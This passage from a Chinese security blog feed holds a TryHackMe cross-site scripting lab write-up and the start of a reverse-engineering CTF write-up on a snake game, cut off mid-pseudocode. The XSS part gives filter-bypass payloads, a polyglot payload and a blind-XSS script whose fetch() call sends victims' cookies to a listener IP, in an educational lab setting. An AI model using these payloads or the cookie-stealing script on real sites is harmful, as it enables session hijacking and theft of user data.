中(iframe是嵌入式框架,是html标签,用来在页面嵌入其他页面)，使得受害者在浏览器中执行代码，从而获取用户会话和信息。</p></li><li><p>如何测试反射型XSS：</p><p>切入点包括：</p><ol type="1"><li>URL query string 中的参数</li><li>URL 文件路径</li><li>HTTP 头部信息</li></ol></li></ul><h3 id="stored-xss存储型xss">Stored XSS（存储型XSS）</h3><p>顾名思义，存储型XSS的 payload存储在web应用程序上(例如数据库)，然后在其他用户访问站点或网页时运行。</p><ul><li><p>示例：</p><p>一个允许用户发布评论的博客网站，但是该网站并没有对评论进行过滤检查，因此可能包含恶意代码。如果我们现在发布包含JavaScript代码的评论，则会被存储在数据库，因此当其他用户访问该文章时将会在他们的浏览器上执行该JavaScript代码。</p></li><li><p>潜在影响：</p><p>恶意的JavaScript代码可以将用户重定向到另一个网站，窃取用户的会话cookie 或是冒充当前用户执行其他操作。</p></li><li><p>如何测试存储型XSS：</p><p>你需要测试每个可能存储数据的入口点，并将恶意代码显示在其他用户可以看到的地方，例如：</p><ol type="1"><li>博客上的评论</li><li>用户的个人资料信息</li><li>网站列表</li></ol><p>有时开发人员认为在客户端上限制用户的输入值是一个好的保护方案，因此将输入值更改为web应用程序不期望的值可能会发现存储型XSS。例如，开发人员期望用户通过下拉菜单选择一个整数作为<strong>age</strong>的值，而我们可以尝试手动发送请求，以达到攻击的目的。</p></li></ul><h3 id="dom-based-xssdom型xss">DOM Based XSS（DOM型XSS）</h3><ul><li><p>DOM是什么？</p><p>DOM即文档对象模型（<strong>D</strong>ocument <strong>O</strong>bject<strong>M</strong>odel），是 HTML 和 XML 文档的应用程序编程接口(API)，它代表一个页面，以便程序可更改文档结构、样式和内容。网页是一个文档，改文档可以在浏览器窗口中显示或作为HTML 源显示。下面是关于 HTML DOM 的图：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110111213075.png" alt="image-20230110111213075"><figcaption aria-hidden="true">image-20230110111213075</figcaption></figure></li><li><p>Exploiting the DOM</p><p>DOM型XSS能够使得JavaScript代码直接在浏览器上执行，无需加载任何新页面或是提交数据给后端代码。当网站上的JavaScript代码用作输入或与用户交互作用时，则会执行该代码。</p></li><li><p>示例：</p><p>假设一个网站的JavaScript代码从<code>window.location.hash</code>参数中获取内容，然后将其写入当前正在查看的页面中。如果没有检查哈希的内容是否含有恶意代码，使得攻击者可以将JavaScript代码注入当前网页中。</p></li><li><p>潜在影响：</p><p>攻击者将精心设计的链接发送给受害者，将他们重定向到另一个网站，或从当前页面、用户会话窃取内容。</p></li><li><p>如何测试 DOM型 XSS：</p><p>测试DOM型 XSS 是很有挑战性的，需要大量的 JavaScript知识去阅读源代码。你需要查找攻击者可以控访问并且控制的变量的代码部分，例如 <strong>window.location.x</strong> 参数。</p><p>当你找到这些代码后，你需要查看它们是如何处理的，以及这些值是否被写入网页的DOM 中或是传递给不安全的 JavaScript 方法(methods)，例如<strong>eval()</strong> 。</p></li></ul><h3 id="blind-xss">Blind XSS</h3><p>Blind XSS 类似于存储型XSS。攻击者的 payload存储在网站上，供其他用户查看，但在这种情况下，攻击者无法看到 payload的工作情况，也自行无法测试它。</p><ul><li><p>示例：</p><p>假设网站上有一个联系表单，你可以通过该表单联系相关成员，消息内容不会被过滤和检查。这使得攻击者可以输入他们想要的任何内容，然后这些消息被转换为支持票，员工们可以在私有网站上查看，从而触发XSS 攻击。</p></li><li><p>潜在影响：</p><p>攻击者使用对应的payload可以将员工门户 URL、员工的cookie信息甚至正在查看的页面内容回调给攻击者的网站。接着，攻击者可能劫持工作人员的会话并访问私有门户。</p></li><li><p>如何测试 Blind XSS</p><p>在测试 blind XSS 漏洞时，你需要确保payload有回调(通常是 HTTP请求)，这样你就能知道代码是否以及何时被执行。</p><p>对于 blind XSS 漏洞，常用的工具是 <a href="https://xsshunter.com/">XSShunter</a> 。你可以用 JavaScript制作自己的工具，但该工具会自动捕获cookie、URL、页面内容等。</p></li></ul><h2 id="实验">实验</h2><h3 id="level-one">Level One</h3><p>在输入框中随便输入一串字符查看结果，如下图所示：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110220357722.png" alt="image-20230110220357722"><figcaption aria-hidden="true">image-20230110220357722</figcaption></figure><p>右键查看网页源代码，发现相关代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, hxt<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>回到初始页面，直接尝试输入 payload：<code>&lt;script&gt;alert('THM');&lt;/script&gt;</code>，成功显示弹窗。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110220703361.png" alt="image-20230110220703361"><figcaption aria-hidden="true">image-20230110220703361</figcaption></figure><h3 id="level-two">Level Two</h3><p>尝试输入上一关的 payload ，发现失败，查看源代码，如下：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"&lt;script&gt;alert('THM');&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>发现输入的字符被嵌入到了<code>input</code> 标签中，于是应该尝试闭合该标签，然后再运行<code>&lt;script&gt;alert('THM');&lt;/script&gt;</code>。所以最终的payload为<strong><code>"&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code></strong>。</p><h3 id="level-three">Level Three</h3><p>输入<code>&lt;script&gt;alert('THM');&lt;/script&gt;</code>，点击<code>Enter</code>后，查看源代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">'THM'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>发现代码被嵌入到了<code>textarea</code> 标签 中，类似于 level two，需要将<code>textarea</code>闭合，因此 payload为：<code>&lt;/textarea&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code>。</p><h3 id="level-four">Level Four</h3><p>步骤如上，查看源代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        document.getElementsByClassName('name')[0].innerHTML='<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">'THM'</span>);</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>';</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>也是需要进行闭合处理，payload为：<code>';alert('THM');//</code>。</p><h3 id="level-five">Level Five</h3><p>输入代码后，查看源代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;&gt;</span>alert('THM');<span class="tag">&lt;/&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>发现<code>script</code>被过滤掉了，因此 payload为：<code>&lt;sscriptcript&gt;alert('THM');&lt;/sscriptcript&gt;</code>。</p><h3 id="level-six">Level Six</h3><p>输入框有默认的字符串，点击<code>Enter</code>按钮后如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110225019628.png" alt="image-20230110225019628" style="zoom:67%;"></p><p>源代码为：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Picture<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/images/cat.jpg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>尝试 level two 的 payload ，变化后的源代码如下：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Picture<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span><span class="attr">scriptalert</span>('<span class="attr">THM</span>');/<span class="attr">script</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>发现<code>&lt;</code>、<code>&gt;</code>这两个符号被过滤了，为了绕过过滤器，我们可以利用<code>img</code>标签的其他属性，例如<code>onload</code>事件，一旦<code>src</code>属性中指定的图像加载到网页上，该事件将执行指定的代码。因此payload 为：<code>/images/cat.jpg" onload="alert('THM');</code>。</p><p>得到flag：<code>THM{XSS_MASTER}</code>。</p><h3 id="polyglots">Polyglots</h3><p>XSS polyglot 是一串文本，算是通用 payload，可以闭合属性、闭合标签以及绕过过滤器。你可以在刚刚完成的六个关卡中使用以下 payload，并且都会成功执行。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</span><br></pre></td></tr></tbody></table></figure><h3 id="blind-xss-1">Blind XSS</h3><p>在目标网站上创建新用户，然后在 <strong>Support Tickets</strong>选项并创建新的 <strong>Ticket</strong> ，如下图所示：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110232709300.png" alt="image-20230110232709300"><figcaption aria-hidden="true">image-20230110232709300</figcaption></figure><p>然后点击该 ticket 的 id 号跳转到 ticket详情页面，查看该页面源代码，发现关键字：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Status:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> Open<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Id:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> 4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Subject:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Created:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> 10/01/2023 15:26<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Contents:<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span>hahaha<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>重新创建一个 ticket，尝试使用<code>&lt;/textarea&gt;hahaha</code>闭合<code>textarea</code>标签，结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110233248687.png" alt="image-20230110233248687" style="zoom:80%;"></p><p>为了验证我们是否可以运行 JavaScript ，于是接着尝试 payload：<code>&lt;/textarea&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code>，点击查看对应的ticket ，出现弹窗：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110233514586.png" alt="image-20230110233514586"><figcaption aria-hidden="true">image-20230110233514586</figcaption></figure><p>通过上述操作证实了 XSS漏洞的存在，接着我们可以通过从另一个用户那里提取的 cookie信息去劫持他们的登录会话以提高我们的权限。为了做到这一点，我们构建的payload 需要能够提取用户的 cookie信息并将其导出到我们选择的另一台web服务器上。首先，我们需要设置监听服务器来接收信息，也就是刚刚提到的“另一台web服务器”。</p><p>使用 <strong>Netcat</strong> 设置监听服务器（攻击者的服务器）：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nlvp 9001</span><br></pre></td></tr></tbody></table></figure><p>然后就是构建 payload，格式为：<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code>。下面是对payload 的解析：</p><ul><li><code>&lt;/textarea&gt;</code>标签的作用是闭合。</li><li><code>&lt;script&gt;</code>标签是为了打开一个编写 JavaScript代码的区域。</li><li><code>fetch()</code>命令的作用是发出 HTTP 请求。</li><li><code>{URL_OR_IP}</code>是 THM 请求捕获器的 URL 或 THM Attackbox 的IP 地址或你在THM VPN网络上的IP地址。（也就是监听服务器的 IP 地址）</li><li><code>?cookie=</code>是包含受害者 cookie 的查询字符串(querystring)。</li><li><code>btoa()</code>命令的作用是对受害者的 cookie 进行base64编码。</li><li><code>document.cookie</code>用于获取 Acme IT Support 网站上受害者的cookie 。</li><li><code>&lt;/script&gt;</code>用于关闭 JavaScript 代码区域。</li></ul><p>接下来就是利用具体的 payload 实现 XSS 攻击：创建一个新的 ticket，填入 payload：<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.43.251:9001?cookie=' + btoa(document.cookie));&lt;/script&gt;</code>，创建完毕后，查看终端，得到结果：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230111100430594.png" alt="image-20230111100430594"><figcaption aria-hidden="true">image-20230111100430594</figcaption></figure><p>最后通过 base64 解码得到 cookie值：<code>4AB305E55955197693F01D6F8FD2D321</code>。</p><p>注：我一开始是使用自己的计算机，通过 openvpn获取一个IP地址，然后在自己的计算机上进行实验，但是无法监听到结果，后来在浏览器使用Attackbox ，得到结果。</p>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TryHackMe</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Reverse-贪食蛇</title>
    <link href="/2023/06/10/nssctf-%E8%B4%AA%E9%A3%9F%E8%9B%87/"/>
    <url>/2023/06/10/nssctf-%E8%B4%AA%E9%A3%9F%E8%9B%87/</url>
    
    <content type="html"><![CDATA[<h1 id="nssctf-reverse-贪食蛇">NSSCTF-Reverse-贪食蛇</h1><p>题目来自于NSSCTF: SWPU NSS新生赛（校外通道）</p><p>下载附件，用IDA打开，首先按 shift+F12 打开 String窗口，没发现什么，于是直接 F5 查看伪代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  __main();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    gameStartMenu();</span><br><span class="line">    gameMainLoop();</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>双击查看各个函数，发现主要的代码实现在<code>gameMainLoop()</code>函数中，两百多行代码看不出什么来，我便准备运行该程序：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220929205947106.png" alt="image-20220929205947106"><figcaption aria-hidden="true">image-20220929205947106</figcaption></figure><p>要得到 60分以上才能得到flag，玩了一局发现有点难度，猜想能够修改判断条件，将 60分改成 1 分不就轻松了吗。再次查看<code>gameMainLoop()</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gameMainLoop</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+2Dh] [ebp-ECBh]</span></span><br><span class="line">  _BYTE v12[<span class="number">3</span>]; <span class="comment">// [esp+31h] [ebp-EC7h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+50Ch] [ebp-9ECh]</span></span><br><span class="line">  <span class="type">int</span> v14[<span class="number">625</span>]; <span class="comment">// [esp+510h] [ebp-9E8h]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [esp+ED7h] [ebp-21h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+ED8h] [ebp-20h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [esp+EDFh] [ebp-19h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+EE0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+EE4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [esp+EE8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp+EECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  gameBegin();</span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">1u</span>);</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)v0);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    v21 = <span class="number">12</span>;</span><br><span class="line">    v20 = <span class="number">12</span>;</span><br><span class="line">    v19 = <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v14, <span class="number">0</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; i += <span class="number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      v1 = <span class="number">624</span> - i;</span><br><span class="line">      v2 = <span class="number">25</span> * i;</span><br><span class="line">      v3 = <span class="number">25</span> * (i + <span class="number">1</span>) - <span class="number">1</span>;</span><br><span class="line">      v14[v3] = <span class="number">-2</span>;</span><br><span class="line">      v14[v2] = v14[v3];</span><br><span class="line">      v14[v1] = v14[v2];</span><br><span class="line">      v14[i] = v14[v1];</span><br><span class="line">    }</span><br><span class="line">    v17 = <span class="number">100</span>;</span><br><span class="line">    v15 = <span class="number">3</span>;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(</span><br><span class="line">      (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)v12 &amp; <span class="number">0xFFFFFFFC</span>),</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">4</span> * (((<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">char</span> *)&amp;v11 - ((<span class="type">unsigned</span> <span class="type">int</span>)v12 &amp; <span class="number">0xFFFFFFFC</span>) + <span class="number">1251</span>) &amp; <span class="number">0xFFFFFFFC</span>) &gt;&gt; <span class="number">2</span>));</span><br><span class="line">    sprintf_s(&amp;v11, <span class="number">32</span>, <span class="string">"mode con: cols=%d lines=%d"</span>, <span class="number">50</span>, <span class="number">25</span>);</span><br><span class="line">    system((<span class="type">const</span> <span class="type">char</span> *)&amp;v11);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">2</span>; j; --j )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        i = rand() % <span class="number">625</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v14[i] );</span><br><span class="line">      v14[i] = <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">    system(<span class="string">"title GluttonousSnake"</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( _kbhit() )</span><br><span class="line">      {</span><br><span class="line">        v15 = _getch();</span><br><span class="line">        <span class="keyword">if</span> ( v15 )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">switch</span> ( v15 )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">case</span> <span class="number">27</span>:</span><br><span class="line">              <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">              <span class="keyword">return</span> result;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">              _getch();</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">65</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">75</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">97</span>:</span><br><span class="line">              <span class="keyword">if</span> ( v17 != <span class="number">100</span> )</span><br><span class="line">                v17 = <span 